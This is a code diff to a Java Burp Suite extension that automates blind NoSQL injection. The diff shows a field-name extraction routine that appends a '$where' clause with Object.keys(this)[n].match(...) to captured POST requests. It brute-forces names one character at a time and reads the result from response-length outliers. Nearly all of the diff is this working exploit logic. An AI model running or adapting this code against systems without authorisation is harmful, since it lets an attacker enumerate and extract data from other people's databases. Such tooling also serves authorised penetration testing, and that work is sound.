@@ -389,26 +389,61 @@ public class NNN implements BurpExtension {
 
     static void extractFieldNames(HttpRequestResponse requestResponse) {
         infoPane.setText(infoPane.getText() + "[i] Extraction of field names\n");
-        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
+        //api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
+        ArrayList<String> names = new ArrayList<>();
         new Thread(() -> {
             try {
                 HttpRequest request2send;
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
                 if (requestResponse.request().method().equals("POST")){
-                    for (Integer number = 0; number < 3; number++) {
-                        for (Integer position = 0; position < 5; position++) {
-                            for (Character character = 'a'; character <= 'z'; character++){
-                                request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, requestResponse.request().toString().length() - 1) + ", \"$where\":\" Object.keys(this)[" + number.toString() + "].match(’^.{" + position.toString() + "}" + character.toString() + ".*’) \"}");
-                                response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
-                                api.logging().logToOutput(number.toString() + " " + position.toString() + " " + character.toString() + " " + response2receive.response().body().length());
-                                //api.logging().logToOutput(response2receive.toString());
+
+                    Boolean finished = false;
+                    int number = 0;
+                    while (!finished || number == 0) {
+                        int position = 0;
+                        StringBuilder sb = new StringBuilder();
+                        while (true) {
+                            ArrayList<HttpRequestResponse> responseList = new ArrayList<>();
+                            for (char ch = '0'; ch <= 'z'; ch++) {
+                                if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')){
+                                    request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, requestResponse.request().toString().length() - 1) + ", \"$where\":\" Object.keys(this)[" + Integer.toString(number) + "].match('^.{" + Integer.toString(position) + "}" + ch + ".*')\"}");
+                                    response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                                    //api.logging().logToOutput(number.toString() + " " + position.toString() + " " + character.toString() + " " + response2receive.response().body().toString().length());
+                                    responseList.add(response2receive);
+                                    //api.logging().logToOutput(request2send.body().toString());
+                                    //api.logging().logToOutput(response2receive.response().toString());
+                                }
                             }
+                            double mean = calculateMean(responseList);
+                            //api.logging().logToOutput(String.valueOf(mean));
+                            // Calculate the standard deviation
+                            double stdDev = calculateStandardDeviation(responseList, mean);
+                            // Find objects with instance parameter values that stand out
+                            //api.logging().logToOutput(String.valueOf(stdDev));
+                            ArrayList<HttpRequestResponse> outliers = findOutliers(responseList, mean, stdDev);
+                            if (!outliers.isEmpty()){
+                                //api.logging().logToOutput(outliers.get(0).request().toString());
+                                api.logging().logToOutput("outlier: " + outliers.get(0).request().toString().charAt(outliers.get(0).request().toString().length()-7));
+                                sb.append(outliers.get(0).request().toString().charAt(outliers.get(0).request().toString().length()-7));
+                            } else {
+                                if (sb.isEmpty() && number > 0){
+                                    finished = true;
+                                } else {
+                                    names.add(sb.toString());
+                                }
+                                break;
+                            }
+                            position++;
+                        }
+                        number++;
+                        if (!sb.isEmpty()){
+                            infoPane.setText(infoPane.getText() + "[i] Extracted fieldname: " + sb + "\n");
                         }
                     }
-                } else {
-
                 }
+
+
 
             } catch (Exception e) {
                 api.logging().logToError("[!] Extract Field Names module failed");
